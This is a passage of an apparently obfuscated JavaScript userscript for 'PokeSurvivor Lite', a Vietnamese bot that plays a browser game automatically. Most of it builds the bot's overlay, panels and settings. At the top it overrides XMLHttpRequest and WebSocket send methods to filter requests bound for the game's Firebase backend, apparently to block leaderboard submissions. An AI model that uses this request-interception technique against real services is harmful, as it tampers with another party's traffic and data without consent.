                XMLHttpRequest.prototype.open = function (method, url, ...r) { this._psUrl = String(url); return XO.call(this, method, url, ...r); };
                XMLHttpRequest.prototype.send = function (body) {
                    if (typeof body === _0xstr(0x66c) && this._psUrl && this._psUrl.includes(_0xstr(0x66d)) && body.includes(_0xstr(0x66e)))
                        body = filterFirestore(body);
                    return XS.call(this, body);
                };
                WebSocket.prototype.send = function (data) {
                    if (typeof data === _0xstr(0x66f) && /firebaseio|firebasedatabase/.test(this.url))
                        data = filterRtdb(data);
                    return WS.call(this, data);
                };
                const ov = document.createElement(_0xstr(0x670));
                ov.dataset.psbotUi = '';
                ov.style.cssText = _0xstr(0x671);
                const dock = document.createElement(_0xstr(0x672));
                dock.dataset.psbotDock = '';
                const DOCK_Z = 2147483000;
                dock.style.cssText = _0xstr(0x673) + DOCK_Z + _0xstr(0x674);
                const hud = document.createElement(_0xstr(0x675));
                hud.style.cssText = _0xstr(0x676);
                dock.append(hud);
                document.body.append(ov, dock);
                function draw() {
                    const r = canvas.getBoundingClientRect();
                    Object.assign(ov.style, { left: r.left + _0xstr(0x677), top: r.top + _0xstr(0x678), width: r.width + _0xstr(0x679), height: r.height + _0xstr(0x67a) });
                    if (ov.width !== canvas.width || ov.height !== canvas.height) {
                        ov.width = canvas.width;
                        ov.height = canvas.height;
                    }
                    const g = ov.getContext(_0xstr(0x67b));
                    g.clearRect(0, 0, ov.width, ov.height);
                    const v = state.view;
                    hud.style.display = tag.on || state.debug ? '' : _0xstr(0x67c);
                    hud.textContent = tag.on
                        ? (tag.pending ? `${tag.pending}: 1=tốt 2=nguy hiểm 3=rift 4=vật cản 5=buff 6=kinh nghiệm 7=vali 8=phá được 9=hồi máu 0=xoá nhãn Esc=huỷ` : _0xstr(0x67d))
                        : `bot ${state.on ? _0xstr(0x67e) : _0xstr(0x67f)} (F8) · ván ${state.done + 1}${state.target ? `/${state.target}` : ''}${state.dwell ? ` · mở vali ${(state.dwell.t / 1000).toFixed(1)}/${CFG.caseTime / 1000}s` : ''} · địch ${v ? v.enemies.length : 0} · exp ${v ? v.xps.length : 0} (hút ${Math.round(state.magnet)}) · tốt ${v ? v.goods.length : 0} · buff ${v ? v.buffs.length : 0} · nguy hiểm ${v ? v.hazards.length : 0} · rift ${v ? v.rifts.length : 0} · chặn rank ${state.netBlocked}${SITE.pilot && SITE.pilot.active() ? ` · lái theo G: ${SITE.pilot.mode()}` : ''}`;
                    if (tag.on && tag.box) {
                        g.strokeStyle = _0xstr(0x680);
                        g.lineWidth = 2;
                        g.strokeRect(tag.box.x - tag.box.w / 2, tag.box.y - tag.box.h / 2, tag.box.w, tag.box.h);
                    }
                    if (state.highlight) {
                        g.strokeStyle = _0xstr(0x681);
                        g.lineWidth = 2;
                        state.lastFrame.forEach(d => { if (d.src === state.highlight)
                            g.strokeRect(d.x - Math.abs(d.w) / 2 - 3, d.y - Math.abs(d.h) / 2 - 3, Math.abs(d.w) + 6, Math.abs(d.h) + 6); });
                    }
                    if (!state.debug || !v || performance.now() - (state.timerChangedAt || 0) > 1500)
                        return;
                    g.lineWidth = 2;
                    const ring = (list, color, r) => { g.strokeStyle = color; list.forEach(d => { g.beginPath(); g.arc(d.x, d.y, r(d), 0, 7); g.stroke(); }); };
                    ring(v.enemies, _0xstr(0x682), () => 10);
                    ring(v.hazards.filter(d => !d.shape), _0xstr(0x683), d => Math.max(d.w, d.h) / 2 + CFG.hazardMargin * v.s);
                    g.strokeStyle = _0xstr(0x684);
                    g.fillStyle = _0xstr(0x685);
                    v.hazards.filter(d => d.shape).forEach(d => {
                        g.beginPath();
                        d.pts.forEach((p, i) => (i ? g.lineTo(p.x, p.y) : g.moveTo(p.x, p.y)));
                        if (d.shape === _0xstr(0x686))
                            g.closePath();
                        g.stroke();
                        if (d.shape === _0xstr(0x687)) {
                            g.beginPath();
                            g.arc(d.pts[0].x, d.pts[0].y, 3, 0, 7);
                            g.fill();
                        }
                    });
                    g.lineWidth = 2;
                    ring(v.goods, _0xstr(0x688), () => 8);
                    ring(v.rifts, _0xstr(0x689), () => 16);
                    ring(v.prizes || [], _0xstr(0x68a), () => 22);
                    ring(v.buffs, _0xstr(0x68b), () => 14);
                    ring(v.heals || [], _0xstr(0x68c), () => CFG.healReach * v.s);
                    ring(v.quest ? [v.quest] : [], _0xstr(0x68d), d => d.hold * v.s);
                    ring(v.xps, _0xstr(0x68e), () => 4);
                    ring(v.cases, _0xstr(0x68f), () => Math.max(6, CFG.caseReach * v.s));
                    g.strokeStyle = _0xstr(0x690);
                    g.setLineDash([2, 6]);
                    g.beginPath();
                    g.arc(v.me.x, v.me.y, state.magnet * v.s, 0, 7);
                    g.stroke();
                    g.setLineDash([]);
                    ring(v.walls || [], _0xstr(0x691), d => (d.rw + 70) * v.s * 0.4);
                    for (const t of v.terrain || []) {
                        g.strokeStyle = t.kind === 1 ? _0xstr(0x692) : _0xstr(0x693);
                        g.strokeRect(t.x + 1, t.y + 1, t.w - 2, t.w - 2);
                    }
                    g.fillStyle = _0xstr(0x694);
                    (v.path || []).forEach(p => g.fillRect(p.x - 2, p.y - 2, 4, 4));
                    if (v.wp) {
                        g.strokeStyle = _0xstr(0x695);
                        g.beginPath();
                        g.arc(v.wp.x, v.wp.y, 8, 0, 7);
                        g.stroke();
                    }
                    g.strokeStyle = _0xstr(0x696);
                    g.beginPath();
                    g.arc(v.me.x, v.me.y, CFG.contact * v.s, 0, 7);
                    g.stroke();
                    if (v.target) {
                        g.strokeStyle = _0xstr(0x697);
                        g.setLineDash([4, 4]);
                        g.beginPath();
                        g.moveTo(v.me.x, v.me.y);
                        g.lineTo(v.target.x, v.target.y);
                        g.stroke();
                        g.setLineDash([]);
                    }
                    const dir = state.dir || v.pdir;
                    if (dir) {
                        g.strokeStyle = _0xstr(0x698);
                        g.beginPath();
                        g.moveTo(v.me.x, v.me.y);
                        g.lineTo(v.me.x + dir[0] * 40, v.me.y + dir[1] * 40);
                        g.stroke();
                    }
                }
                const RUNS_KEY = _0xstr(0x699);
                const UI_EVENTS = [_0xstr(0x69a), _0xstr(0x69b), _0xstr(0x69c), _0xstr(0x69d), _0xstr(0x69e), _0xstr(0x69f), _0xstr(0x6a0), _0xstr(0x6a1)];
                let topZ = DOCK_Z;
                const raise = el => { if (el.parentNode === document.body)
                    el.style.zIndex = String(++topZ); };
                function draggable(el, key, grip = el) {
                    const detach = () => {
                        if (el.parentNode === document.body)
                            return;
                        const r = el.getBoundingClientRect();
                        document.body.append(el);
                        Object.assign(el.style, { position: _0xstr(0x6a2), left: r.left + _0xstr(0x6a3), top: r.top + _0xstr(0x6a4), maxHeight: _0xstr(0x6a5) });
                        raise(el);
                    };
                    if (el !== dock)
                        el.addEventListener(_0xstr(0x6a6), () => raise(el), true);
                    const place = (x, y) => {
                        el.style.left = Math.min(Math.max(0, x), innerWidth - 40) + _0xstr(0x6a7);
                        el.style.top = Math.min(Math.max(0, y), innerHeight - 24) + _0xstr(0x6a8);
                    };
                    try {
                        const p = JSON.parse(localStorage.getItem(key));
                        if (p) {
                            detach();
                            place(p.x, p.y);
                        }
                    }
                    catch { }
                    grip.addEventListener(_0xstr(0x6a9), e => {
                        if (e.button || !e.target.closest(_0xstr(0x6aa)) || e.target.closest(_0xstr(0x6ab)))
                            return;
                        e.preventDefault();
                        detach();
                        const r = el.getBoundingClientRect(), dx = e.clientX - r.left, dy = e.clientY - r.top;
                        const move = ev => { ev.stopPropagation(); place(ev.clientX - dx, ev.clientY - dy); };
                        const up = () => {
                            [_0xstr(0x6ac), _0xstr(0x6ad), _0xstr(0x6ae)].forEach(t => removeEventListener(t, t === _0xstr(0x6af) ? move : up, true));
                            try {
                                localStorage.setItem(key, JSON.stringify({ x: parseFloat(el.style.left), y: parseFloat(el.style.top) }));
                            }
                            catch { }
                        };
                        addEventListener(_0xstr(0x6b0), move, true);
                        addEventListener(_0xstr(0x6b1), up, true);
                        addEventListener(_0xstr(0x6b2), up, true);
                    });
                }
                const dragCss = _0xstr(0x6b3);
                function besidePanel(el, key) {
                    let saved = null;
                    try {
                        saved = localStorage.getItem(key);
                    }
                    catch { }
                    if (saved || matchMedia(SMALL).matches)
                        return raise(el);
                    const r = ctl.getBoundingClientRect(), w = el.offsetWidth;
                    const others = [ms, lv, it].filter(p => p && p !== el && p.style.display !== _0xstr(0x6b4) && p.parentNode === document.body);
                    let x = Math.max(r.right, ...others.map(p => p.getBoundingClientRect().right)) + 6;
                    if (x + w > innerWidth)
                        x = Math.min(r.right + 6, innerWidth - w - 4);
                    document.body.append(el);
                    Object.assign(el.style, { position: _0xstr(0x6b5), left: Math.max(0, x) + _0xstr(0x6b6), top: r.top + _0xstr(0x6b7), maxHeight: _0xstr(0x6b8) });
                    raise(el);
                }
                const SMALL = _0xstr(0x6b9);
                const ctl = document.createElement(_0xstr(0x6ba));
                ctl.dataset.psbotCtl = ctl.dataset.psbotUi = '';
                ctl.className = _0xstr(0x6bb);
                ctl.style.cssText = _0xstr(0x6bc);
                const PSB_CSS = `
    [data-psbot-ui] { --psb-bg:#141a22; --psb-bg2:#171d27; --psb-bg3:#1d2530; --psb-bd:#2e3845; --psb-tx:#e6ebf2; --psb-mu:#8d99a8; --psb-hi:#4da3ff; --psb-blue:#8fb4ff }
    [data-psbot-ui].psb { box-sizing:border-box; display:flex; flex-direction:column; overflow-x:hidden; overflow-y:auto; max-height:calc(100vh - 16px); font:13px/1.4 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; color:var(--psb-tx); background:var(--psb-bg2); border:1px solid var(--psb-bd); border-radius:12px; box-shadow:0 8px 24px #0009 }
    [data-psbot-ui] .psb-head { display:flex; align-items:center; gap:8px; padding:10px 12px; background:#1c2331; border-bottom:1px solid var(--psb-bd) }
    [data-psbot-ui] .psb-title { flex:1; min-width:0; font-weight:800; font-size:12.5px; letter-spacing:.09em; text-transform:uppercase; color:var(--psb-blue) }
    [data-psbot-ui] .psb-title a { display:block; margin-top:2px; color:var(--psb-mu); font-weight:700; font-size:11px; letter-spacing:0; text-transform:none; text-decoration:none }
    [data-psbot-ui] .psb-body { display:flex; flex-direction:column; gap:9px; padding:12px }
    [data-psbot-ui] .psb-sec { display:flex; align-items:center; gap:8px; margin-top:2px; font-size:10.5px; font-weight:800; letter-spacing:.1em; text-transform:uppercase; color:var(--psb-mu) }
    [data-psbot-ui] .psb-sec::after { content:""; flex:1; height:1px; background:var(--psb-bd) }
    [data-psbot-ui] .psb-row { display:flex; align-items:center; gap:6px }
    [data-psbot-ui] .psb-seg { display:flex; gap:4px }
    [data-psbot-ui] .psb-seg .psb-btn { padding:6px 2px; font-size:12px }
    [data-psbot-ui] .psb-btn { flex:1; font:700 13px system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; color:var(--psb-tx); background:var(--psb-bg3); border:1px solid #3a4553; border-radius:8px; padding:7px 10px; cursor:pointer; white-space:nowrap }
    [data-psbot-ui] .psb-btn:hover { filter:brightness(1.25) }
    [data-psbot-ui] .psb-btn:active { transform:translateY(1px) }
    [data-psbot-ui] .psb-btn:disabled { opacity:.4; cursor:not-allowed; filter:none }
    [data-psbot-ui] .psb-btn.go { color:#7ee2a8; background:#1f4a33; border-color:#2f6a46 }
    [data-psbot-ui] .psb-btn.stop { color:#ff9a9a; background:#4d2429; border-color:#7a3a41 }
    [data-psbot-ui] .psb-btn.acc { color:var(--psb-acc,#4da3ff); border-color:#1f4a7a; border-color:color-mix(in srgb, var(--psb-acc,#4da3ff) 55%, #000) }
    [data-psbot-ui] .psb-btn.info { color:var(--psb-blue); border-color:#34507c }
    [data-psbot-ui] .psb-btn.sel { color:var(--psb-acc,#4da3ff); background:#16304f; background:color-mix(in srgb, var(--psb-acc,#4da3ff) 20%, var(--psb-bg3)); border-color:var(--psb-acc,#4da3ff) }
    [data-psbot-ui] .psb-icon { flex:0 0 auto; background:none; border:0; padding:0 4px; font:700 16px system-ui,sans-serif; color:var(--psb-mu); cursor:pointer }
    [data-psbot-ui] .psb-icon:hover { color:var(--psb-tx) }
    [data-psbot-ui] .psb-in { box-sizing:border-box; font:13px system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; color:var(--psb-tx); background:var(--psb-bg3); border:1px solid #3a4553; border-radius:8px; padding:6px 9px; outline:none }
    [data-psbot-ui] .psb-in:focus { border-color:var(--psb-acc,#4da3ff) }
    [data-psbot-ui] .psb-muted { color:var(--psb-mu); font-size:12px }
    [data-psbot-ui] .psb-icon:disabled { opacity:.25; cursor:default }
    [data-psbot-ui] .psb-dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; background:var(--psb-mu) }
    [data-psbot-ui] .psb-dot.on { background:#4ade80; box-shadow:0 0 6px #4ade80 }
    [data-psbot-ui] .psb-tip { position:relative; font-size:12px; color:#cdd6e2; background:var(--psb-bg3); border:1px solid var(--psb-bd); border-left:3px solid var(--psb-acc,#4da3ff); border-radius:8px; padding:6px 24px 6px 9px }
    [data-psbot-ui] .psb-tip b { color:var(--psb-hi) }
    [data-psbot-ui] .psb-tip .psb-icon { position:absolute; top:2px; right:2px; font-size:14px }
    [data-psbot-ui] .psb-tabs { display:flex; margin:0; background:var(--psb-bg); border-bottom:1px solid var(--psb-bd) }
    [data-psbot-ui] .psb-tab { flex:1; font:700 12.5px system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; color:var(--psb-mu); background:none; border:0; border-bottom:2px solid transparent; margin-bottom:-1px; padding:8px 4px; cursor:pointer }
    [data-psbot-ui] .psb-tab:hover { color:var(--psb-tx) }
    [data-psbot-ui] .psb-tab[aria-selected="true"] { color:var(--psb-tx); border-bottom-color:var(--psb-acc,#4da3ff) }
    [data-psbot-ui] .psb-body[hidden] { display:none }
    [data-psbot-ui] input[type="checkbox"] { flex:0 0 auto; width:15px; height:15px; margin:0 2px 0 0; accent-color:#3b82f6; cursor:pointer }
    [data-psbot-ui] .psb-sw { flex:0 0 auto; width:26px; height:26px; padding:0; border-radius:50%; border:2px solid transparent; cursor:pointer }
    [data-psbot-ui] .psb-sw[aria-pressed="true"] { border-color:#fff }
    [data-psbot-ctl][data-min] > :not(:first-child) { display:none !important }
    [data-psbot-ctl][data-min] > .psb-head { border-bottom:0 }
    [data-psbot-ui], [data-psbot-ui] * { scrollbar-width:none }
    [data-psbot-ui]::-webkit-scrollbar, [data-psbot-ui] *::-webkit-scrollbar { display:none }
    [data-psbot-ctl]:not([data-min]) [data-ctl="hplay"] { display:none }
    [data-psbot-ctl][data-min] { width:auto !important }
    [data-psbot-ctl][data-min] .psb-title { white-space:nowrap }
    [data-psbot-ui] [data-ctl="hplay"].on { color:#ff9a9a }
    @media (pointer: coarse) { [data-psbot-ui] button:not(.psb-sw), [data-psbot-ui] select, [data-psbot-ui] input:not([type="checkbox"]) { min-height: 34px; font-size: 14px !important } [data-ctl="keys"] { display: none } }
    @media ${SMALL} {
      [data-psbot-dock] { flex-direction:row !important; flex-wrap:wrap }
      [data-psbot-ui].psb { font-size:12px; border-radius:10px; max-height:calc(100vh - 72px); overflow-y:auto }
      [data-psbot-ctl] { width:210px !important }
      [data-psbot-ui][data-psbot-ms], [data-psbot-ui][data-psbot-order] { width:250px !important }
      [data-psbot-ui] .psb-head { padding:4px 8px; gap:4px }
      [data-psbot-ui] .psb-title { font-size:11px }
      [data-psbot-ui] .psb-title a, [data-ctl="tip"], [data-ctl="keys"] { display:none }
      [data-psbot-ui] .psb-body { padding:6px 8px; gap:5px }
      [data-psbot-ui] .psb-tab { padding:4px; font-size:12px }
      [data-psbot-ui] .psb-btn { padding:4px 8px; font-size:12px }
      [data-psbot-ui] .psb-in { padding:3px 6px; font-size:12px }
      [data-psbot-ui] .psb-muted, [data-psbot-ui] .psb-tip { font-size:11px }
      [data-psbot-ui] button:not(.psb-sw), [data-psbot-ui] select, [data-psbot-ui] input:not([type="checkbox"]) { min-height:28px !important; font-size:12px !important }
      [data-psbot-ui] .psb-icon { min-height:0 !important; font-size:16px !important }
    }`;
                const RUN_OPTS = SITE.runOptions || [];
                ctl.innerHTML = `
    <div data-drag class="psb-head" style="${dragCss}" title="Kéo để di chuyển"><span class="psb-title">PokeSurvivor Lite v${VERSION} <a href="${REPO}" target="_blank" rel="noopener" title="Bản gốc trên GitHub (MIT)">by damhieu2808 · bản Lite</a></span>
      <button data-ctl="hplay" class="psb-icon" title="Chạy / dừng (panel đang thu gọn)">▶</button>
      <button data-ctl="min" class="psb-icon" title="Thu gọn / mở rộng">–</button></div>
    <style>${PSB_CSS}</style>
    <div class="psb-tabs" role="tablist">
      <button data-tab="ctl" class="psb-tab" role="tab" aria-selected="true">🎮 Điều khiển</button>
      <button data-tab="set" class="psb-tab" role="tab" aria-selected="false">⚙ Cài đặt</button>
    </div>
    <div data-pane="ctl" class="psb-body">
      <label class="psb-row">Số ván
        <input data-ctl="runs" class="psb-in" type="number" min="0" step="1" style="width:70px">
        <span class="psb-muted">0 = vô hạn</span></label>
      <div class="psb-row"><button data-ctl="play" class="psb-btn go">▶ Chạy</button></div>
      <div class="psb-row">
        <button data-ctl="moveset" class="psb-btn acc" title="4 move ưu tiên của từng pokémon">⚔ Moveset</button>
        <button data-ctl="levelup" class="psb-btn acc" title="Thứ tự bot chọn thẻ khi lên cấp">⬆ Level-up</button>
      </div>
      <div class="psb-row">
        <button data-ctl="items" class="psb-btn acc" title="Thứ tự đồ cầm bot chọn">🎒 Item</button>
        <span style="flex:1"></span>
      </div>
      ${RUN_OPTS.length ? `<div class="psb-row" style="align-items:flex-end">${RUN_OPTS.map(o => `<label class="psb-muted" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;font-size:11px" title="${o.title}">${o.label}<select data-run="${o.key}" class="psb-in" style="width:100%;padding:4px 2px">${o.options.map(([v, t]) => `<option value="${v}">${t}</option>`).join('')}</select></label>`).join('')}</div>` : ''}
      <div class="psb-muted"><span data-ctl="dot" class="psb-dot"></span><span data-ctl="status"></span></div>
      <div data-ctl="haltacts" class="psb-row" style="display:none"></div>
      ${SITE.pilot ? _0xstr(0x6bd) : ''}
      <label class="psb-row psb-muted" title="Bật: bot liên tục đổi skill (E). Tắt: không đổi, bạn tự đổi bằng tay"><input data-ctl="autoskill" type="checkbox"> Auto skill</label>
      ${SITE.farmItems ? `<label class="psb-row psb-muted" title="${SITE.farmItems.title}"><input data-ctl="farmitems" type="checkbox"> ${SITE.farmItems.label}</label>` : ''}
      ${SITE.noRank ? _0xstr(0x6be) : ''}
      <div data-ctl="keys" class="psb-muted" style="font-size:11px">F8 bật/tắt bot · F9 hiển thị overlay</div>
      <div data-ctl="tip" class="psb-tip"><button data-ctl="tipx" class="psb-icon" title="Ẩn mẹo này">×</button>
        <b>💡 Mẹo đi 30 phút:</b><br>1. Tapu Fini — Draining Kiss · Aqua Ring · Harden · Whirlpool<br>2. Mewtwo — Confusion · Shadow Ball · Nasty Plot · Harden<br>3. Lunala — Confusion · Shadow Ball · Harden · Nasty Plot<br>4. Eternatus — Shadow Ball · Harden · Nasty Plot</div>
    </div>
    <div data-pane="set" class="psb-body" hidden>
      <div class="psb-sec">⚡ Mức tăng FPS</div>
      <div class="psb-seg">
        <button data-preset="off" class="psb-btn" title="Giữ nguyên đồ hoạ của game">Gốc</button>
        <button data-preset="light" class="psb-btn" title="Tắt bóng / blur / glow / hiệu ứng menu, pixel nhanh, độ phân giải tối đa 1×">Nhẹ</button>
        <button data-preset="strong" class="psb-btn" title="Như Nhẹ, thêm tắt hạt + số sát thương, độ phân giải 0.75×, vẽ 1/2 số khung, ẩn quái ở xa">Mạnh</button>
        <button data-preset="max" class="psb-btn" title="Nhẹ nhất: độ phân giải 0.5×, vẽ 1/3 số khung, ẩn mọi quái, không vẽ nền bản đồ (hình rất đơn giản, bot vẫn chơi bình thường)">Tối đa</button>
      </div>
      <div class="psb-sec">🪄 Xoá hiệu ứng</div>
      <label class="psb-row psb-muted" title="Chặn shadowBlur / shadowColor / filter của canvas: các hiệu ứng này rất nặng khi vẽ"><input data-lite="shadow" type="checkbox"> Bóng &amp; blur trong game</label>
      <label class="psb-row psb-muted" title="Không vẽ vòng sáng (gradient tròn) và mọi thứ vẽ bằng chế độ trộn cộng sáng (lighter): chói, loé, hào quang"><input data-lite="glow" type="checkbox"> Ánh sáng / glow / loé sáng</label>
      <label class="psb-row psb-muted" title="Không vẽ số sát thương nổi và các hạt bụi nhỏ mờ"><input data-lite="part" type="checkbox"> Hạt bụi &amp; số sát thương</label>
      <label class="psb-row psb-muted" title="Animation / transition của menu game gần như tức thì, bỏ backdrop blur, filter và đổ bóng"><input data-lite="css" type="checkbox"> Hiệu ứng động của menu</label>
      <div class="psb-sec">👾 Ẩn quái</div>
      <div class="psb-row"><label class="psb-muted" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;font-size:11px" title="Không vẽ quái ra màn hình; bot vẫn nhận ra chúng">Hiển thị quái
          <select data-lite="hide" class="psb-in"><option value="0">Không ẩn</option><option value="1">Ẩn quái xa (giữ quái gần)</option><option value="2">Ẩn tất cả quái</option></select></label></div>
      <div class="psb-muted" style="font-size:11px">Chỉ ẩn hình: bot vẫn thấy quái và né / đánh như thường. Nhân vật của bạn không bị ẩn.</div>
      <div class="psb-sec">🎞 Hiệu năng vẽ</div>
      <div class="psb-row" style="align-items:flex-end">
        <label class="psb-muted" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;font-size:11px" title="Hạ độ phân giải canvas: giảm mạnh tải GPU, nhất là trên điện thoại màn hình nét cao">Độ phân giải
          <select data-lite="dpr" class="psb-in"><option value="0">Gốc</option><option value="1">1×</option><option value="0.75">0.75×</option><option value="0.5">0.5×</option><option value="0.35">0.35×</option></select></label>
        <label class="psb-muted" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;font-size:11px" title="Chỉ vẽ 1 trong N khung hình; logic game vẫn chạy đủ nên game KHÔNG chậm đi. Tăng FPS mạnh nhất sau độ phân giải">Bỏ khung hình
          <select data-lite="skip" class="psb-in"><option value="1">Vẽ đủ</option><option value="2">Vẽ 1/2</option><option value="3">Vẽ 1/3</option><option value="4">Vẽ 1/4</option></select></label>
      </div>
      <div class="psb-row" style="align-items:flex-end">
        <label class="psb-muted" style="flex:1;min-width:0;display:flex;flex-direction:column;gap:2px;font-size:11px" title="Thử nghiệm: chỉ cho game chạy tối đa ngần này khung hình/giây (làm game chạy chậm theo, dùng khi máy quá nóng). Thường để Không, hãy dùng Bỏ khung hình">Giới hạn FPS (game chậm theo)
          <select data-lite="fps" class="psb-in"><option value="0">Không</option><option value="60">60</option><option value="45">45</option><option value="30">30</option></select></label>
      </div>
      <label class="psb-row psb-muted" title="Tắt làm mượt ảnh và phóng to kiểu pixel: game pixel-art nên gần như không đổi hình mà vẽ nhanh hơn"><input data-lite="pixel" type="checkbox"> Pixel nhanh (tắt làm mượt ảnh)</label>
      <label class="psb-row psb-muted" title="Không vẽ các mảng nền 256×256 của bản đồ (bot vẫn đọc chúng để biết tường / nước). Nhẹ nhất nhưng thấy nền đen"><input data-lite="bg" type="checkbox"> Không vẽ nền bản đồ</label>
      <div data-ctl="litenote" class="psb-muted" style="font-size:11px">Độ phân giải đổi ngay nếu game tự co giãn; chưa thấy đổi thì tải lại trang (sẽ thoát ván đang chơi). “Vẽ 1/2” chỉ bỏ vẽ khung hình, game vẫn chạy đủ tốc độ.</div>
      <button data-ctl="reload" class="psb-btn info">↻ Tải lại trang</button>
      <div class="psb-sec">🎨 Giao diện</div>
      <div data-ctl="accents" class="psb-row">
        <button data-acc="vang" class="psb-sw" title="Vàng" style="background:#ffcc33"></button>
        <button data-acc="xanh" class="psb-sw" title="Xanh dương" style="background:#60a5fa"></button>
        <button data-acc="luc" class="psb-sw" title="Xanh lá" style="background:#4ade80"></button>
        <button data-acc="hong" class="psb-sw" title="Hồng" style="background:#f472b6"></button>
      </div>
      <div class="psb-muted" style="font-size:11px">Bản chỉnh sửa từ PokeSurvivorTool của damhieu2808 (MIT).</div>
    </div>`;
                dock.append(ctl);
                const loadingLine = document.getElementById(_0xstr(0x6bf));
                if (loadingLine)
                    loadingLine.remove();
                draggable(dock, _0xstr(0x6c0), ctl);
                const $ = k => ctl.querySelector(`[data-ctl="${k}"]`);
                try {
                    $(_0xstr(0x6c1)).value = localStorage.getItem(RUNS_KEY) || _0xstr(0x6c2);
                }
                catch {
                    $(_0xstr(0x6c3)).value = _0xstr(0x6c4);
                }
                const MIN_KEY = _0xstr(0x6c5);
                const setMin = min => {
                    if (min)
                        ctl.dataset.min = '';
                    else
                        delete ctl.dataset.min;
                    $(_0xstr(0x6c6)).textContent = min ? _0xstr(0x6c7) : _0xstr(0x6c8);
                    try {
                        localStorage.setItem(MIN_KEY, min ? _0xstr(0x6c9) : '');
                    }
                    catch { }
                };
                try {
                    const v = localStorage.getItem(MIN_KEY);
                    setMin(v === null ? matchMedia(SMALL).matches : !!v);
                }
                catch { }
                $(_0xstr(0x6ca)).onclick = () => setMin(!(_0xstr(0x6cb) in ctl.dataset));
                const TIP_KEY = _0xstr(0x6cc);
                try {
                    if (localStorage.getItem(TIP_KEY))
                        $(_0xstr(0x6cd)).remove();
                }
                catch { }
                if ($(_0xstr(0x6ce)))
                    $(_0xstr(0x6cf)).onclick = () => { $(_0xstr(0x6d0)).remove(); try {
                        localStorage.setItem(TIP_KEY, _0xstr(0x6d1));
                    }
                    catch { } };
                const SKILL_KEY = _0xstr(0x6d2);
                try {
                    CFG.swapSkills = localStorage.getItem(SKILL_KEY) !== _0xstr(0x6d3);
                }
                catch { }
                $(_0xstr(0x6d4)).checked = CFG.swapSkills;
                $(_0xstr(0x6d5)).onchange = () => { CFG.swapSkills = $(_0xstr(0x6d6)).checked; try {
                    localStorage.setItem(SKILL_KEY, CFG.swapSkills ? _0xstr(0x6d7) : _0xstr(0x6d8));
                }
                catch { } };
                if ($(_0xstr(0x6d9))) {
                    $(_0xstr(0x6da)).checked = SITE.farmItems.get();
                    $(_0xstr(0x6db)).onchange = () => SITE.farmItems.set($(_0xstr(0x6dc)).checked);
                }
                if ($(_0xstr(0x6dd))) {
                    $(_0xstr(0x6de)).checked = SITE.noRank.get();
                    $(_0xstr(0x6df)).onchange = () => SITE.noRank.set($(_0xstr(0x6e0)).checked);
                }
                RUN_OPTS.forEach(o => { const sel = ctl.querySelector(`[data-run="${o.key}"]`); sel.value = o.get(); sel.onchange = () => o.set(sel.value); });
                $(_0xstr(0x6e1)).onclick = async (e) => {
                    const b = e.target.closest(_0xstr(0x6e2)), acts = $(_0xstr(0x6e3)).acts;
                    if (!b || !acts)
                        return;
                    const a = acts[+b.dataset.act];
                    log(a.label);
                    await a.run();
                    control.play();
                };
                ctl.querySelectorAll(_0xstr(0x6e4)).forEach(b => b.addEventListener(_0xstr(0x6e5), () => {
                    ctl.querySelectorAll(_0xstr(0x6e6)).forEach(t => t.setAttribute(_0xstr(0x6e7), t === b));
                    ctl.querySelectorAll(_0xstr(0x6e8)).forEach(p => { p.hidden = p.dataset.pane !== b.dataset.tab; });
                    ctl.dataset.tab = b.dataset.tab;
                    if (b.dataset.tab === _0xstr(0x6e9))
                        liteSync();
                }));
                const LITE = window.PSLite;
                function liteSync() {
                    if (!LITE) {
                        $(_0xstr(0x6ea)).textContent = _0xstr(0x6eb);
                        return;
                    }
                    const c = LITE.get(), match = LITE.matchPreset();
                    ctl.querySelectorAll(_0xstr(0x6ec)).forEach(i => { i.checked = !!c[i.dataset.lite]; });
                    ctl.querySelectorAll(_0xstr(0x6ed)).forEach(x => { x.value = String(c[x.dataset.lite]); });
                    ctl.querySelectorAll(_0xstr(0x6ee)).forEach(b => b.classList.toggle(_0xstr(0x6ef), b.dataset.preset === match));
                }
                if (LITE) {
                    ctl.querySelectorAll(_0xstr(0x6f0)).forEach(i => { i.onchange = () => { LITE.set({ [i.dataset.lite]: i.checked }); liteSync(); }; });
                    ctl.querySelectorAll(_0xstr(0x6f1)).forEach(x => { x.onchange = () => { LITE.set({ [x.dataset.lite]: +x.value }); liteSync(); }; });
                    ctl.querySelectorAll(_0xstr(0x6f2)).forEach(b => { b.onclick = () => { LITE.preset(b.dataset.preset); liteSync(); }; });
                }
                else
                    ctl.querySelectorAll(_0xstr(0x6f3)).forEach(e => { e.disabled = true; });
                liteSync();
                $(_0xstr(0x6f4)).onclick = () => location.reload();
                const ACCENTS = { vang: [_0xstr(0x6f5), _0xstr(0x6f6)], xanh: [_0xstr(0x6f7), _0xstr(0x6f8)], luc: [_0xstr(0x6f9), _0xstr(0x6fa)], hong: [_0xstr(0x6fb), _0xstr(0x6fc)] };
                const ACC_KEY = _0xstr(0x6fd);
                const setAccent = (k, keep) => {
                    if (!ACCENTS[k])
                        k = _0xstr(0x6fe);
                    document.documentElement.style.setProperty(_0xstr(0x6ff), ACCENTS[k][0]);
                    document.documentElement.style.setProperty(_0xstr(0x700), ACCENTS[k][1]);
                    ctl.querySelectorAll(_0xstr(0x701)).forEach(b => b.setAttribute(_0xstr(0x702), b.dataset.acc === k));
                    if (!keep)
                        try {
                            localStorage.setItem(ACC_KEY, k);
                        }
                        catch { }
                };
                ctl.querySelectorAll(_0xstr(0x703)).forEach(b => { b.onclick = () => setAccent(b.dataset.acc); });
                try {
                    setAccent(localStorage.getItem(ACC_KEY), true);
                }
                catch {
                    setAccent(_0xstr(0x704), true);
                }
                UI_EVENTS.forEach(t => ctl.addEventListener(t, e => e.stopPropagation()));
                const control = {
                    play() {
                        const n = Math.max(0, Math.floor(+$(_0xstr(0x705)).value || 0));
                        try {
                            localStorage.setItem(RUNS_KEY, String(n));
                        }
                        catch { }
                        Object.assign(state, { target: n, done: 0, runEnded: null, saveFrom: 0, saveClicked: false, on: true, started: true, restartAt: 0, halt: null, haltActions: null });
